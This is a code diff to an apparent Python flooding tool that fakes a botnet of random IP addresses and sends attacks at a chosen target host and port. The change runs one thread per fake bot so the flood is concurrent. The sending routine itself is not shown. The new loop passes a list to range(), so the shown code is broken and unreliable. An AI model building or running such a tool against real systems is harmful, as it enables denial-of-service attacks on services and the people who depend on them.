@@ -2,23 +2,19 @@
  * @author Shadoworker5 Dev
  * @email shadoworker5.dev@gmail.com
  * @create date 2023-07-05 21:31:09
- * @modify date 2023-07-06 21:51:24
+ * @modify date 2023-07-07 21:07:16
 """
 import argparse
 import socket
-from string import digits
-from random import sample, randint
+from random import randint
+from threading import Thread
 
 RED             = '\033[31m'
 GREEN           = '\033[32m'
 connected_bot   = 0
 
 def generateIP():
-    ip = []
-    for _ in range(4):
-        ip.append(str(randint(1, 254)))
-    
-    return '.'.join(ip)
+    return '.'.join([str(randint(1, 254)) for _ in range(4)])
 
 def generateBotnet(count):
     address_ip = []
@@ -48,8 +44,14 @@ def sendAttack(target, port, bot_ip):
 
 def attack(target, port, count_botnet):
     try:
+        async_call = []
         for bot in generateBotnet(count_botnet):
-            sendAttack(target, port, bot)
+            t = Thread(target=sendAttack, args=(target, port, bot))
+            async_call.append(t)
+        print("Attack starting...............")
+        
+        for i in range(async_call):
+            async_call[i].start()
     except Exception as e:
         print(f'Error in attack: {e}')
         exit(1)
